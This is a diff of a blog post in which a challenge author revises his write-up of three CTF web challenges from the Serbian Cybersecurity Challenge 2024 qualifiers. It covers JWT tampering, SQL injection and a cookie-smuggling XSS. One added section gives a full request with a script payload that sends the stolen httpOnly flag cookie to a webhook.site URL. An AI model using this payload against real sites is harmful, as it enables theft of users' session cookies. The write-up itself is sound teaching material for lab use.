@@ -4,15 +4,15 @@ description: "Writeup for Neglegentia, Ecology, See in the Dark web challenges, 
 categories: ['Writeup']
 tags: ['Serbian Cybersecurity Challenge', 'CTF']
 permalink: serbian-cybersecurity-challenge-2024-quals-writeup
-read_time: 14
-date: 2024-04-26 00:20 +0200
+read_time: 15
+date: 2024-04-29 23:00 +0200
 image:
-  path: /assets/img/cards/tjctf-2023-web-challenges-writeup.png
+  path: /assets/img/cards/serbian-cybersecurity-challenge-2024-quals-writeup.png
 ---
 
 This year's SCC qualification phase was particularly fun for me, as I had the chance to experience the competition from the other side — I participated in creating the challenges! It was very exciting to observe how participants approach and tackle the challenges that I made. In this post, I'll present my challenges and their solutions, but first, let's start with a brief introduction to the competition. 🙌
 
-> If you want, you can also [jump](#challenge-sources) straight to the challenges.
+> If you want, you can also [jump straight to the challenges](#challenge-sources).
 
 **Serbian Cybersecurity Challenge** is an annual national cybersecurity competition organized by **Cyber Hero** program under the [Cyber Security Network Foundation](https://sajberbezbednost.rs/){:target="_blank"}. The competition is in CTF jeopardy format and consists of two phases: an online qualification round for individuals typically held in March, and the final round for teams held on-site in May. The best performing individuals during both phases are invited to the Serbian national team to participate in another annual competition, [European Cyber Security Challenge](https://ecsc2024.it/){:target="_blank"}.
 
@@ -27,7 +27,9 @@ The first phase of the **Serbian Cybersecurity Challenge 2024** was held online 
 
 # Challenge sources
 
-During the time I was writing this post, the challenges were still available at [scc2024.sajberheroj.rs](https://scc2024.sajberheroj.rs/){:target="_blank"}. Since that won't last forever, you can get the source code of my challenges on my [public git repository](){:target="_blank"}. Each challenge specifies what was intented for the competitors to download and review — everything else should be hidden. It is recommended not to read the actual source code while solving the challenges to avoid spoilers and preserve the authentic SCC experience. 😉
+During the time I was writing this post, the challenges were still available at [scc2024.sajberheroj.rs](https://scc2024.sajberheroj.rs/){:target="_blank"}. Since that won't last forever, you can get the source code of my challenges on my [public git repository](https://github.com/dusanlazic/scc2024-quals-challenges){:target="_blank"}. Each challenge specifies what was intended for the competitors to download and review — everything else should be hidden. It is recommended not to read the actual source code while solving the challenges to avoid spoilers and preserve the authentic SCC experience. 😉
+
+Below are the writeups of the challenges, sorted in descending order by the number of solves.
 
 # Writeups
 
@@ -41,7 +43,7 @@ During the time I was writing this post, the challenges were still available at 
 >
 > 📦 web_neglegentia.zip
 
-Let's start with the challenge with the most solves. First we open the challenge website.
+Let's start with the challenge that had the most solves. First we open the challenge website.
 
 ![](/uploads/{{ page.permalink }}/ss1.png)
 
@@ -189,7 +191,7 @@ router.post('/login', async (req, res) => {
 // ...
 ```
 
-Unfortunately, there is some input validation based on regex making us unable to perform SQL injection attack. Even though that code in `database.js` is an awful practice, this particular vulnerability is patched. It's still awful though.
+Unfortunately, there is some input validation based on regex preventing us from executing SQL injection attack. Even though that code in `database.js` is an awful practice, this particular vulnerability is patched. It's still awful though.
 
 ### 2. `registerUser`, `persistMessage`
 
@@ -254,7 +256,7 @@ This function was included in the library [documentation](https://www.npmjs.com/
 
 ![](/uploads/{{ page.permalink }}/ss4.png)
 
-Now we know that we can simply change the payload of our JWT token using [jwt.io](https://jwt.io){:target="_blank"}. We should be able to modify `sub` field to another user's ID and takeover their account.
+Now we know that we can simply change the payload of our JWT token using [jwt.io](https://jwt.io){:target="_blank"}. We should be able to modify the `sub` field to another user's ID and takeover their account.
 
 ![](/uploads/{{ page.permalink }}/ss5.png)
 
@@ -262,13 +264,13 @@ We see that the user IDs are in UUID format.
 
 > If the IDs were integers, we could assume that they are not randomly generated and try these techniques:
 > - set the ID to 0 or 1 since that may be the ID of an admin account
-> - obtain other users' account IDs through API and takeover their accounts
+> - obtain other users' account IDs through the API and takeover their accounts
 > - try incrementing or decrementing IDs to takeover random accounts
 > - brute force IDs
 
-Due to the unpredictable nature of UUIDs, we cannot guess other user's UUID that easily. Also, exploring the routes show that no endpoint returns user IDs, so we cannot discover them either.
+Due to the unpredictable nature of UUIDs, we cannot guess other users' IDs that easily. Also, exploring the routes show that no endpoint returns user IDs, so we cannot discover them either.
 
-Anyway, `sub` field gets passed to a query that is vulnerable to SQL injection, so we can takeover someone's account just by their username instead.
+Anyway, the value of the `sub` field gets passed to a query that is vulnerable to SQL injection, so we can takeover someone's account just by their username instead.
 
 ```js
 async getUserById(id) {
@@ -696,7 +698,7 @@ Flask says that the flag will be sent to 127.0.0.1, but in reality it will be se
 >
 > 📦 web_see_in_the_dark.zip
 
-Finally, the writeup that everyone has been waiting for. It took 13h 29min to get the first solve on this challenge. Until then, some participants argued that it's called "See in the Dark" because it's actually impossible, just like seeing in the dark. While two contestants have proven that it's solvable, let's solve it together one more time!
+Finally, the writeup that everyone has been waiting for. It took 13h 29min to get the first solve on this challenge. Until then, some participants argued that it's called "See in the Dark" because solving it is actually impossible, just like seeing in the dark. While two contestants have proven that it's solvable, let's solve it together one more time!
 
 This challenge also includes the source code. Let's read it.
 
@@ -754,7 +756,7 @@ This is a simple bot used for simulating a user that interacts with the web app.
 
 We see that the flag is in the user's cookie. The cookie has **httpOnly** flag set, which means that we cannot access it through JavaScript and it becomes significantly harder (often impossible) to steal it using XSS. This challenge presents one instance when it's possible to steal such cookie with XSS and how to do it.
 
-Let's open the website to see what will the bot interact with.
+Let's open the website to see what our bot will see.
 
 ![](/uploads/{{ page.permalink }}/ss17.png)
 
@@ -764,7 +766,7 @@ We see a list of posts, a search bar, a hyperlink for reporting bugs and a butto
 
 ![](/uploads/{{ page.permalink }}/ss19.png)
 
-After trying a simple XSS payload (`<script>alert(1)</script>`) we see that it works and we successfuly found reflected XSS on the following URL:
+After trying a simple XSS payload (`<script>alert(1)</script>`) we see that it works and we have successfully found reflected XSS on the following URL:
 
 ```
 http://localhost:2000/search?q=<script>alert(1)</script>
@@ -833,7 +835,7 @@ document.getElementById('theme-toggle').addEventListener('click', function () {
 
 ![](/uploads/{{ page.permalink }}/ss22.png)
 
-Another notable observation is that the value of the `theme` cookie is displayed on the page. Additionally, broken CSS suggests that it is also rendered within the head tag.
+Another notable observation is that the value of the `theme` cookie is displayed on the page. If we modify it, we will see different text on the button. Additionally, broken CSS suggests that it is also rendered within the head tag.
 
 ![](/uploads/{{ page.permalink }}/ss23.png)
 
@@ -852,15 +854,15 @@ Blog Test
 
 Why is this notable?
 
-**1. httpOnly cookie can be stolen using XSS if it is rendered on the page.**
+**1. httpOnly cookie can be stolen using XSS if its value is rendered on the page.**
 
 If the `theme` cookie was httpOnly and we wanted to steal it using XSS, we could just read its content from the page.
 
 **2. Possibility of cookie smuggling.**
 
-When triggering a bot, we are able to set a cookie that gets rendered on the page. We might be able to trick the server into parsing the cookie string incorrectly and render remaining cookies (with and without httpOnly flag) on the page.
+When triggering a bot, we are able to set a cookie that gets rendered on the page. We might be able to trick the server into parsing the cookie string incorrectly and render some other cookies (with and without httpOnly flag) on the page.
 
-For more, read this post: [https://blog.ankursundara.com/cookie-bugs/](blog.ankursundara.com/cookie-bugs){:target="_blank"}.
+For more, read this post: [blog.ankursundara.com/cookie-bugs](https://blog.ankursundara.com/cookie-bugs){:target="_blank"}.
 
 Let's first confirm that our XSS payload works on the bot. We can do it by making a HTTP request to a webhook on [webhook.site](https://webhook.site/){:target="_blank"} using `fetch`.
 
@@ -885,7 +887,7 @@ driver.add_cookie(
 driver.get(url)
 ```
 
-We will set the cookies in the same order, since the order will be important in cookie smuggling.
+We will set the cookies in the same order, since the order will be important in cookie smuggling. In Chrome and Firefox, cookies should be ordered by last updated time, from least recent to most recent. 
 
 Now we will pretend that our browser is the bot's browser, so let's play around.
 
@@ -895,7 +897,7 @@ Opening this URL:
 http://localhost:2000/search?q=<script>console.log(document.cookie)</script>
 ```
 
-... will output only `theme=light` in the browser console, because `flag` cookie is httpOnly. Since we can modify the cookie before httpOnly cookie is set, we can try a technique mentioned in the blog post I linked above.
+... will output only `theme=light` in the browser console. We won't be able to see the `flag` cookie because it's httpOnly. Since we can modify the cookie before httpOnly cookie is set, we can try a technique mentioned in the blog post I linked above.
 
 > Say a browser sends 3 cookies, **RENDER_TEXT**, **JSESSIONID**, **ASDF**, resulting in the following cookie header being sent.
 >
@@ -912,13 +914,13 @@ http://localhost:2000/search?q=<script>console.log(document.cookie)</script>
 
 In our case, `theme` cookie is the cookie that gets rendered and `flag` cookie is the httpOnly cookie we want to steal.
 
-Let's try setting `theme` cookie to `"light`, `flag` cookie, and `asdf` cookie to `pozz"`.
+Let's try setting `theme` cookie to `"light`, `flag` cookie to fake flag value, and `asdf` cookie to `pozz"` and refresh the page.
 
 ![](/uploads/{{ page.permalink }}/ss25.png)
 
-Great! Our `flag` cookie, even though it's httpOnly, is now rendered on the page and **readable by JavaScript**. Now we need to complete our payload.
+Great! Our `flag` cookie, even though it's httpOnly, is now rendered on the page and is **readable by JavaScript**. Now we need to complete our payload.
 
-The form only lets us set one cookie to open double quotes. However, since we can already exploit XSS, we can use JS to set a second cookie with the closing quotes. We will also need to reload the page to see those cookie manipulations in action and prevent accidental inifite reloads. After reloading, flag value should appear on the theme toggle button, just like on the screenshot above. Finally, use fetch to exfiltrate whatever is written on that button to get the flag. 🚩
+The form only lets us set one cookie to open double quotes. However, since we can already exploit XSS, we can use JS to set a second cookie with the closing quotes. We will also need to reload the page to see those cookie manipulations in action, and we should check if the second cookie is set to prevent accidental inifite reloads. After reloading, flag value should appear on the theme toggle button, just like on the screenshot above. Finally, use fetch to exfiltrate whatever is written on that button to get the flag. The code should look like this:
 
 ```html
 <script>
@@ -931,3 +933,26 @@ The form only lets us set one cookie to open double quotes. However, since we ca
 </script>
 ```
 
+We can remove the whitespaces from the code to keep it in a single line. Our final request that will exfiltrate the flag is below:
+
+```
+POST /report HTTP/1.1
+Host: localhost:2000
+Content-Type: application/json
+
+{
+    "description": "poz",
+    "theme": "\"light",
+    "pageUrl":"http://localhost:2000/search?q=<script>if (!document.cookie.split('; ').find(row => row.startsWith('asdf='))){document.cookie=`asdf=pozz\"; path=/`;location.reload();}else{fetch(`https://webhook.site/5d59809f-809e-438a-aea6-a6038cb363ca/?flag=${document.getElementById('theme-toggle').textContent}`);}</script>"
+}
+```
+
+Here is the flag! 🚩
+
+![](/uploads/{{ page.permalink }}/ss26.png)
+
+# Final Thoughts
+
+As the timer ran out on CTFd platform and the qualification phase was officially over, I was left with a mix of anticipation and satisfaction. Creating these challenges and then watching how they were tackled has been a uniquely fulfilling experience. Seeing the competition from the creator's perspective has given me appreciation for the complexity and creativity demanded of both the challenge creators and the participants. 
+
+The final round is up next, and I'm excited to compete against the participants who tackled my challenges. I'm curious to see how they'll use their experience from the quals to face the upcoming obstacles. Until then, happy hacking and have a great day! 😎🔥
